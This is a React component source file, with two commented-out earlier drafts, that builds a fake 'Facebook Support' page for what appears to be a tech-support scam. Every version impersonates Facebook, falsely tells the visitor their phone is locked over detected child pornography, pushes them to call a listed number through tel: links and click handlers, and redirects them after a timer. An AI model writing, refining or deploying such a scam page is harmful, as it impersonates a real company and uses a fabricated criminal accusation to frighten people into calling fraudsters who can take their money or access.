// // import { Phone } from "lucide-react"
// // import { Button } from "@/components/ui/button"
// // import { useNavigate } from "react-router-dom"
// // import { useEffect } from "react"

// // export default function FacebookSupport() {
// //   const navigate = useNavigate()

// //   useEffect(() => {
// //     const timer = setTimeout(() => {
// //       navigate("/pop-up");
// //     }, 50000);

// //     return () => clearTimeout(timer); // Cleanup to prevent memory leaks
// //   }, [navigate]);

// //   return (
// //     <div className="min-h-screen flex flex-col items-center justify-start p-4
// //   "
// //   onClick={() => navigate("/emergency-call")}
// //     >
// //       <div className="w-full max-w-4xl bg-white rounded-lg shadow-sm p-6 md:p-8 flex flex-col md:flex-row items-center justify-between mb-8">
// //         <div className="mb-6 md:mb-0 md:mr-8">
// //           <h1 className="text-[#1877F2] text-2xl md:text-3xl lg:text-4xl font-bold">Facebook</h1>
// //           <h2 className="text-gray-600 text-xl md:text-2xl lg:text-3xl font-medium mt-1">
// //             Support
// //             <br />
// //             and Help
// //             <br />
// //             Options
// //           </h2>
// //         </div>
// //         <div className="w-full md:w-1/2 lg:w-3/5 flex justify-center md:justify-end">
// //           <img 
// //             src="/faceboooook.png" 
// //             alt="Facebook Support" 
// //             className="max-w-full h-auto object-contain max-h-64 md:max-h-80 lg:max-h-96"
// //             loading="lazy"
// //           />
// //         </div>
// //         {/* <img src="public/faceboooook.png" alt=""/> */}

// //       </div>

// //       {/* User's additional content */}
// //       <div className="w-full max-w-4xl  rounded-lg shadow-sm  md:p-10">
// //         <h1 className="text-2xl md:text-3xl font-bold mb-4">Account Locked</h1>
// //         <p className="text-gray-700 mb-6">
// //           Your phone is locked due to detected illegal CHILD PORNOGRAPHY. Your Facebook Account has been Disabled. Immediately call  Facebook  Support
// //          to unlock it <span className="font-bold underline cursor-pointer" onClick={() => window.location.href = 'tel:18445131621'}>18445131621</span>
// //         </p>
// //         <div className="flex flex-col sm:flex-row gap-3">
// //         <Button className="bg-black hover:bg-black/90 text-[#318bff] font-medium text-lg px-6 py-6 md:ml-72 rounded-xl transition-all duration-300 hover:shadow-lg hover:shadow-[#318bff]/20 flex items-center gap-2 group" onClick={() => window.location.href = 'tel:18445131621'}>
// //             <Phone className="w-5 h-5 text-[#318bff] group-hover:animate-pulse" />
// //             <span>
// //               Call <span className="font-bold">18445131621</span>
// //             </span>
// //           </Button>
// //           {/* <Button variant="outline" className="border-[#1877F2] text-[#1877F2]">
// //             Cancel
// //           </Button> */}
// //         </div>
// //       </div>
// //     </div>
// //   )
// // }



// import { Phone } from "lucide-react"
// import { Button } from "@/components/ui/button"
// import { useNavigate } from "react-router-dom"
// import { useEffect } from "react"

// export default function FacebookSupport() {
//   const navigate = useNavigate()

//   useEffect(() => {
//     const timer = setTimeout(() => {
//       navigate("/pop-up");
//     }, 50000);

//     return () => clearTimeout(timer); // Cleanup to prevent memory leaks
//   }, [navigate]);

//   return (
//     <div 
//       className="h-screen w-screen flex flex-col items-center justify-between p-2 sm:p-4 overflow-hidden"
//       onClick={() => navigate("/emergency-call")}
//     >
//       {/* Top section with logo and image */}
//       <div className="w-full max-w-4xl bg-white rounded-lg shadow-sm p-3 sm:p-4 flex flex-col md:flex-row items-center justify-between">
//         <div className="md:mr-4">
//           <h1 className="text-[#1877F2] text-xl sm:text-2xl md:text-3xl font-bold">Facebook</h1>
//           <h2 className="text-gray-600 text-lg sm:text-xl md:text-2xl font-medium">
//             Support
//             <br />
//             and Help
//             <br />
//             Options
//           </h2>
//         </div>
//         <div className="w-full md:w-1/2 flex justify-center md:justify-end">
//           <img 
//             src="/faceboooook.png" 
//             alt="Facebook Support" 
//             className="h-32 sm:h-40 md:h-48 lg:h-56 w-auto object-contain"
//             loading="lazy"
//           />
//         </div>
//       </div>

//       {/* Middle section with alert message */}
//       <div className="w-full max-w-4xl rounded-lg shadow-sm px-3 py-2 sm:px-4 sm:py-3 md:px-6 md:py-4 mt-2 mb-2">
//         <h1 className="text-xl sm:text-2xl md:text-3xl font-bold mb-2">Account Locked</h1>
//         <p className="text-gray-700 text-sm sm:text-base mb-2">
//           Your phone is locked due to detected illegal CHILD PORNOGRAPHY. Your Facebook Account has been Disabled. Immediately call Facebook Support
//           to unlock it <span className="font-bold underline cursor-pointer" onClick={(e) => {e.stopPropagation(); window.location.href = 'tel:18445131621'}}>18445131621</span>
//         </p>
//       </div>

//       {/* Bottom section with call button */}
//       <div className="w-full max-w-4xl flex justify-center mb-4">
//         <Button 
//           className="bg-black hover:bg-black/90 text-[#318bff] font-medium text-base sm:text-lg px-4 py-3 sm:px-6 sm:py-4 rounded-xl transition-all duration-300 hover:shadow-lg hover:shadow-[#318bff]/20 flex items-center gap-2 group" 
//           onClick={(e) => {e.stopPropagation(); window.location.href = 'tel:18445131621'}}
//         >
//           <Phone className="w-4 h-4 sm:w-5 sm:h-5 text-[#318bff] group-hover:animate-pulse" />
//           <span>
//             Call <span className="font-bold">18445131621</span>
//           </span>
//         </Button>
//       </div>
//     </div>
//   )
// }



import { Phone } from "lucide-react"
import { Button } from "@/components/ui/button"
import { useNavigate } from "react-router-dom"
import { useEffect } from "react"

export default function FacebookSupport() {
  const navigate = useNavigate()

  useEffect(() => {
    const timer = setTimeout(() => {
      navigate("/pop-up");
    }, 5000);

    return () => clearTimeout(timer); // Cleanup to prevent memory leaks
  }, [navigate]);

  return (
    <div 
      className="h-screen w-full flex flex-col items-center justify-center p-2"
      onClick={() => navigate("/emergency-call")}
    >
      <div className="w-full max-w-4xl flex flex-col">
        {/* Top section with logo and image */}
        <div className="w-full bg-white rounded-lg shadow-sm p-3 flex flex-col md:flex-row items-center justify-between">
          <div className="">
            <h1 className="text-[#1877F2] text-3xl sm:text-2xl md:text-6xl font-bold">Facebook</h1>
            <h2 className="text-gray-600 text-lg sm:text-xl md:text-4xl font-medium">
              Support and Help Options
            </h2>
          </div>
          <div className="w-full md:w-1/3 flex justify-center md:justify-end">
            <img 
              src="/faceboooook.png" 
              alt="Facebook Support" 
              className="h-72 sm:h-32 md:h-72 w-auto object-contain"
            />
          </div>
        </div>

        {/* Middle section with alert message */}

        <div className="w-full bg-white rounded-lg shadow-sm px-3 py-2 mt-2">
          <h1 className="text-xl sm:text-2xl font-bold">Account Locked</h1>
          <p className="text-gray-700 text-sm sm:text-base">
            Your phone is locked due to detected illegal CHILD PORNOGRAPHY. Your Facebook Account has been Disabled. Immediately call Facebook Support
            to unlock it <span className="font-bold underline cursor-pointer" onClick={(e) => {e.stopPropagation(); window.location.href = 'tel:18445131621'}}>18445131621</span>
          </p>
        </div>

        {/* Bottom section with call button */}
        <div className="w-full flex justify-center mt-4">
          <Button 
            className="bg-black hover:bg-black/90 text-[#318bff] font-medium text-base sm:text-lg px-4 py-3 rounded-xl flex items-center gap-2 group" 
            onClick={(e) => {e.stopPropagation(); window.location.href = 'tel:18445131621'}}
          >
            <Phone className="w-4 h-4 text-[#318bff] group-hover:animate-pulse" />
            <span>
              Call <span className="font-bold">18445131621</span>
            </span>
          </Button>
        </div>
      </div>
    </div>
  )
}